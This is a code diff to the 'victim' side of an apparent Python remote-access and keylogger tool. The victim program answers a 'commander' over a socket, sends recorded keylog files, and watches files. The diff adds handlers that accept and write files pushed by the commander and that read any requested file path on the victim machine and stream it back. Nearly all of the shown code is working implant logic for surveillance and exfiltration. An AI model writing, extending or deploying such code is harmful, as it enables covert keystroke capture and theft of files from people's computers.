@@ -1,4 +1,5 @@
 import threading
+import time
 from victim_utils import *
 
 if __name__ == '__main__':
@@ -120,8 +121,8 @@ if __name__ == '__main__':
                 # c) Check if data is to send recorded keystroked file to commander
                 if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
                     print(constants.CLIENT_RESPONSE.format(data.decode()))
-                    print("[+] Client has requested to transfer all recorded keylog files...")
-                    print("[+] Now checking if there are any potentially recorded keylog '.txt' files...")
+                    print(constants.GET_KEYLOG_REQUEST_MSG)
+                    print(constants.GET_KEYLOG_CHECK_MSG)
 
                     # Get the current directory
                     current_directory = os.getcwd()
@@ -213,6 +214,79 @@ if __name__ == '__main__':
                         print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
                         client_socket.send((constants.STATUS_FALSE + "/" +
                                             constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
+
+                # e) Receive File from Commander
+                if data.decode() == constants.TRANSFER_FILE_SIGNAL:
+                    print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
+
+                    # Send an initial acknowledgement to the client (giving them green light for transfer)
+                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+
+                    # Call to receive the file data and checksum from the client
+                    filename = client_socket.recv(1024).decode()
+                    print(constants.RECEIVING_FILE_MSG.format(filename))
+
+                    with open(filename, constants.WRITE_BINARY_MODE) as file:
+                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                        while True:
+                            file_data = client_socket.recv(1024)
+                            if not file_data:
+                                break  # No more data received
+                            if file_data.endswith(eof_marker):
+                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                                break
+                            else:
+                                file.write(file_data)
+
+                    # Send ACK to commander (if good)
+                    if is_file_openable(filename):
+                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
+                        client_socket.send(constants.VICTIM_ACK.encode())
+                    else:
+                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+
+                # f) Transfer file to Commander
+                if data.decode() == constants.GET_FILE_SIGNAL:
+                    print(constants.CLIENT_RESPONSE.format(constants.GET_FILE_SIGNAL))
+
+                    # Send ACK
+                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+
+                    # Receive File Path
+                    file_path = client_socket.recv(1024).decode()
+                    print(constants.GET_FILE_CMDR_PATH.format(file_path))
+                    print(constants.GET_FILE_INIT_TRANSFER)
+
+                    # If exists, then initiate file transfer
+                    if os.path.exists(file_path):
+                        client_socket.send(constants.GET_FILE_EXIST.encode())
+
+                        # Wait for client/victim to buffer
+                        time.sleep(1)
+
+                        with open(file_path, 'rb') as file:
+                            while True:
+                                data = file.read(1024)
+                                if not data:
+                                    break
+                                client_socket.send(data)
+
+                        # Send EOF signal to prevent receiver's recv() from blocking
+                        client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)
+
+                        # Get an ACK from victim for success
+                        transfer_result = client_socket.recv(1024).decode()
+
+                        if transfer_result == constants.VICTIM_ACK:
+                            print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
+                                                                            client_address[0],
+                                                                            client_address[1]))
+                        else:
+                            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+                    else:
+                        client_socket.send(constants.GET_FILE_NOT_EXIST.encode())
+                        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
